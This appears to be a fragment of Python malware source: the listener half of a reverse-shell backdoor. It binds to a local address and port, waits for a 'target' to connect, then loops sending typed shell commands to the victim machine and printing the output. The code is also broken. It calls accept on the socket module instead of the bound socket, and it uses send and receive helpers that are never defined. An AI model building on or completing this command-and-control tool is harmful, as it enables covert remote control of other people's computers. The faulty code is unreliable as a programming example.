import socket

def target_communication():
        while True:
                command = input('* Shell~%s: ' % str(ip))
                reliable_send(command)
                if command == 'quit':
                        break
                else:
                        result = reliable_recv()
                        print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.236', 5555))
print('[+] Listening For Incoming Connections')
sock.listen(5)
target, ip = socket.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()